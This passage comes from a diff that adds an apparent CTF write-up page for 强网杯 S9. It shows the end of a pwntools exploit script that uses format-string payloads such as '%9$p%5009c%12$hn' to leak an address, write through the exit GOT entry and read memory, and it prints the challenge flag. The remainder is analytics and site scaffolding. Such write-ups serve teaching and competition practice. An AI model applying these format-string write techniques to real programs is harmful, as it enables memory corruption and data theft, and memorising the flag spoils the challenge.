+    target.sendlineafter(b&quot;pay?x0a&quot;, b&quot;255&quot;)
+
+    payload = flat(
+        b&quot;A&quot; * 0x100,
+        b&quot;%9$p%5009c%12$hn&quot;,
+    )
+    target.sendlineafter(b&quot;report:&quot;, payload)
+
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, flat(elf.got[&quot;exit&quot;]))
+
+    flag = int(target.recv(0xA), 16) + 0x1E0
+    target.success(f&quot;flag: {hex(flag)}&quot;)
+
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;2&quot;)
+
+    raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, b&quot;255&quot;)
+
+    payload = flat(
+        b&quot;A&quot; * 0x100,
+        b&quot;%12$s&quot;,
+    )
+    target.sendlineafter(b&quot;report:&quot;, payload)
+    target.sendlineafter(b&quot;exit&quot;, b&quot;1&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, flat(flag))
+
+    target.interactive()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+```
+
+## Flag
+
+:spoiler[`flag{0ec285cb-c1b3-49ff-820b-8075a639bc1e}`]
+</pre> <pre class="textmode-pre phile-pre phile-footer-pre">
+
+ret <a href="/volume/1/">&lt;volume_1&gt;</a>
+</pre> </article> <script type="module" src="/_astro/PhileShell.astro_astro_type_script_index_0_lang.CtuB20jf.js"></script>   </main>  <vercel-analytics data-props="{}" data-params="{&quot;volume&quot;:&quot;1&quot;,&quot;slug&quot;:&quot;2025-强网杯-s9&quot;}" data-pathname="/volume/1/2025-%E5%BC%BA%E7%BD%91%E6%9D%AF-s9/"></vercel-analytics> <script type="module">var v=()=>{window.va||(window.va=function(...i){window.vaq||(window.vaq=[]),window.vaq.push(i)})},w="@vercel/analytics",h="2.0.1";function f(){return typeof window<"u"}function l(){try{const e="production"}catch{}return"production"}function m(e="auto"){if(e==="auto"){window.vam=l();return}window.vam=e}function y(){return(f()?window.vam:l())||"production"}function d(){return y()==="development"}function b(e,i){if(!e||!i)return e;let n=e;try{const t=Object.entries(i);for(const[r,s]of t)if(!Array.isArray(s)){const o=u(s);o.test(n)&&(n=n.replace(o,`/[${r}]`))}for(const[r,s]of t)if(Array.isArray(s)){const o=u(s.join("/"));o.test(n)&&(n=n.replace(o,`/[...${r}]`))}return n}catch{return e}}function u(e){return new RegExp(`/${g(e)}(?=[/?#]|$)`)}function g(e){return e.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function E(e){return e.scriptSrc?a(e.scriptSrc):d()?"https://va.vercel-scripts.com/v1/script.debug.js":e.basePath?a(`${e.basePath}/insights/script.js`):"/_vercel/insights/script.js"}function k(e,i){var n;let t=e;if(i)try{t={...(n=JSON.parse(i))==null?void 0:n.analytics,...e}}catch{}m(t.mode);const r={sdkn:w+(t.framework?`/${t.framework}`:""),sdkv:h};return t.disableAutoTrack&&(r.disableAutoTrack="1"),t.viewEndpoint&&(r.viewEndpoint=a(t.viewEndpoint)),t.eventEndpoint&&(r.eventEndpoint=a(t.eventEndpoint)),t.sessionEndpoint&&(r.sessionEndpoint=a(t.sessionEndpoint)),d()&&t.debug===!1&&(r.debug="false"),t.dsn&&(r.dsn=t.dsn),t.endpoint?r.endpoint=t.endpoint:t.basePath&&(r.endpoint=a(`${t.basePath}/insights`)),{beforeSend:t.beforeSend,src:E(t),dataset:r}}function a(e){return e.startsWith("http://")||e.startsWith("https://")||e.startsWith("/")?e:`/${e}`}function S(e={debug:!0},i){var n;if(!f())return;const{beforeSend:t,src:r,dataset:s}=k(e,i);if(v(),t&&((n=window.va)==null||n.call(window,"beforeSend",t)),document.head.querySelector(`script[src*="${r}"]`))return;const o=document.createElement("script");o.src=r;for(const[c,p]of Object.entries(s))o.dataset[c]=p;o.defer=!0,o.onerror=()=>{const c=d()?"Please check if any ad blockers are enabled and try again.":"Be sure to enable Web Analytics for your project and deploy again. See https://vercel.com/docs/analytics/quickstart for more information.";console.log(`[Vercel Web Analytics] Failed to load script from ${r}. ${c}`)},document.head.appendChild(o)}function $({route:e,path:i}){var n;(n=window.va)==null||n.call(window,"pageview",{route:e,path:i})}function A(){try{return}catch{}}function j(){try{return}catch{}}customElements.define("vercel-analytics",class extends HTMLElement{constructor(){super();try{const i=JSON.parse(this.dataset.props??"{}"),n=JSON.parse(this.dataset.params??"{}");S({...i,disableAutoTrack:!0,framework:"astro",basePath:A(),beforeSend:window.webAnalyticsBeforeSend},j());const t=this.dataset.pathname;$({route:b(t??"",n),path:t})}catch(i){throw new Error(`Failed to parse WebAnalytics properties: ${i}`)}}});</script> <script type="module" src="/_astro/BaseLayout.astro_astro_type_script_index_0_lang.GD05J9Fp.js"></script> </body> </html>
